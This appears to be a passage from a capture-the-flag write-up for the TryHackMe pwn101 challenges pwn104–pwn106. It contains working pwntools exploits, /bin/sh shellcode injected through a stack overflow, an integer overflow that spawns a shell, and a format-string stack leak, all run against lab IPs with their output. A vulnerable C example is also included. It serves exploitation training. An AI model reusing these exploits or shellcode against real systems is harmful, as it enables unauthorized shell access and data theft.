   6   0x7fffffffe428
   7 0x36cf4868f6a97138
────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l kaaaaaaa
Finding cyclic pattern of 8 bytes: b'kaaaaaaa' (hex: 0x6b61616161616161)
Found at offset 80
pwndbg>
```
---
Offset is 80 or 0x50 in hexadecimal

we node 8 bytes more for the junk part

let's craft the pyaload:

---

```python3
from pwn import *

context.binary = binary = "./pwn104-1644300377109.pwn104"

# shellcode from : https://www.exploit-db.com/exploits/46907
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

#p = process()
p = remote("10.10.16.230", 9004)

p.recv()
output = p.recv()

buffer_address = int(output.split(b"at")[1].strip().decode("utf-8"), 16)

payload = shellcode + b"A"*(0x50 - len(shellcode)) + b"B" * 0x8 + p64(buffer_address)

p.sendline(payload)

p.interactive()

```

---

let's test it...........

---
```bash
❯ python3 exploit.py
[*] '/home/lynk/thm/pwn101/pwn104/pwn104-1644300377109.pwn104'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
[+] Opening connection to 10.10.16.230 on port 9004: Done
[*] Switching to interactive mode
$ ls
flag.txt
pwn104
pwn104.c
$ cat flag.txt
THM{0h_n0o0o0o_h0w_Y0u_Won??}
$
```

---

---

# Challenge 5: pwn105

let's run the program:

---

```bash
❯ file pwn105-1644300421555.pwn105
pwn105-1644300421555.pwn105: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=efe6d094462867e6b08e74de43fb7126e7b14ee4, for GNU/Linux 3.2.0, not stripped
❯ checksec --file=pwn105-1644300421555.pwn105
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   50 Symbols	 No	0		1		pwn105-1644300421555.pwn105
❯ ./pwn105-1644300421555.pwn105
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105          

-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 12
]>> 13

[*] ADDING 12 + 13
[*] RESULT: 25

╭─ ~/thm/pwn101/pwn105                                                                                                                                
╰─❯ 

```
---

```bash
❯ ./pwn105-1644300421555.pwn105
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105          

-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> c
]>> 
[*] ADDING 32539 + 0
[*] RESULT: 32539
❯
```

---

Decompiled Main function..

---

<img width="1404" alt="Screenshot 2024-04-16 at 1 01 21 AM" src="https://github.com/Lynk4/THM/assets/44930131/127c6e75-f2d6-4591-bd14-328363047845">

---

What it does..........

1. Prints the banner.
2. It accepts our input and keeps it in variable num1.
3. It accepts our input and keeps it in variable num2.
4. A variable is created that adds up num1 and num2.
5. An if check is used to determine whether the num1 variable is less than zero or the num2 variable is less than zero.
6. If the check is met, it will depart. 
7. If the sum variable is less than zero, it busts a shell. 
8. However, if none of those conditions are met, it just adds up our input and returns the calculated value.

So, when I give it the input 2,147,483,647 as num1 and 1 as num2, it will evaluate to a negative number.

---

```bash
❯ sudo nc 10.10.18.115 9005
[sudo] password for lynk: 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 105          

-------=[ BAD INTEGERS ]=-------
|-< Enter two numbers to add >-|

]>> 2147483647
]>> 1

[*] C: -2147483648
[*] Popped Shell
[*] Switching to interactive mode
ls
flag.txt
pwn105
pwn105.c
cat flag.txt
THM{VerY_b4D_1n73G3rsss}
```

---

---

# Challenge 6: pwn106

Let's run the binary:

Basic file check:
---
```bash
❯ checksec --file=pwn106-user-1644300441063.pwn106-user
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   49 Symbols	 No	0		2		pwn106-user-1644300441063.pwn106-user
```

---

```bash
❯ ./pwn106-user-1644300441063.pwn106-user
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: lynk

Thanks lynk
```
---

Thers's a Format String vulnerability:

Here's a example demonstrating a format string vulnerability in a C program:

```c
#include <stdio.h>

int main(int argc, char *argv[]) {
    char buffer[100];
    int secret = 42;

    printf("Enter your name: ");
    scanf("%s", buffer); // Vulnerable input

    printf(buffer); // Vulnerable printf

    printf("\nSecret value: %d\n", secret);

    return 0;
}
```
---

In the above example, the program prompts the user to enter their name and then directly passes the input to printf() without proper validation. If an attacker enters a format string containing %x, %s, or %n, they can manipulate the behavior of printf().

For instance, if the attacker enters %x %x %x %x, printf() will attempt to read values from the stack as if they were additional arguments. This can lead to the leaking of sensitive information, such as the value of secret or other stack contents.

---

So now lets' write down our exploit:

---

```python3
from pwn import *

context.binary = binary = "./pwn106-user-1644300441063.pwn106-user"

payload = "%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"

# p = process()
p = remote("10.10.93.97", 9006)
p.recv()
p.recv()
p.sendline(payload)

output = p.recv().strip().split(b" ")[1].split(b".")

flag = ""

for word in output:
	flag += bytes.fromhex(word.decode("utf-8"))[: -1].decode("utf-8")
print("The Flag is: {}".format(flag))
```

---

Running the exploit:

```bash
❯ python3 exploit2.py
[*] '/home/lynk/thm/pwn101/pwn106/pwn106-user-1644300441063.pwn106-user'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 10.10.93.97 on port 9006: Done
/home/lynk/thm/pwn101/pwn106/exploit2.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(payload)
The Flag is: THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}
[*] Closed connection to 10.10.93.97 port 9006
```

---

---

